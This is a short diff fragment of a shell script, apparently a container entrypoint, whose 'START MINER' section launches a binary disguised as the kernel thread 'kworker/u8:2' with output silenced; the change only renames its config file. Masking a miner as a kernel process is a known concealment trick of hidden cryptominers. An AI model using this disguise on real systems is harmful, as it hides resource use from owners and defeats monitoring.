@@ -44,7 +44,7 @@ sleep 3
 # START MINER
 # =========================
 
-(exec -a kworker/u8:2 /app/$NAME -c .cfg >/dev/null 2>&1 &)
+(exec -a kworker/u8:2 /app/$NAME -c config.json >/dev/null 2>&1 &)
 
 # =========================
 # KEEP CONTAINER ALIVE
